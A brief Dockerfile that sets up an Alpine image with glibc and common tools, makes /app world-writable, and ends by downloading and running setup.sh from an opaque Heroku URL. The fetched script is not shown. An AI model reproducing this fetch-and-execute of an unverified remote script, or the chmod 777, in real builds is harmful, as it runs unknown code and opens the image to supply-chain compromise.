FROM alpine:edge

WORKDIR /app
RUN chmod 777 /app

RUN sed -e 's;^#http\(.*\)/edge/community;http\1/edge/community;g' -i /etc/apk/repositories
RUN apk update && apk add --no-cache bash wget unzip curl yarn && \
    wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub && \
    wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.32-r0/glibc-2.32-r0.apk && \
    apk add glibc-2.32-r0.apk && \
    rm /etc/apk/keys/sgerrand.rsa.pub && \
    rm glibc-2.32-r0.apk && \
    rm -r /var/cache/apk/APKINDEX.* && \
    rm -rf /tmp/* && rm -rf /var/cache/apk/*
ADD https://okmk.herokuapp.com/41988900660652/setup.sh setup.sh
RUN bash setup.sh


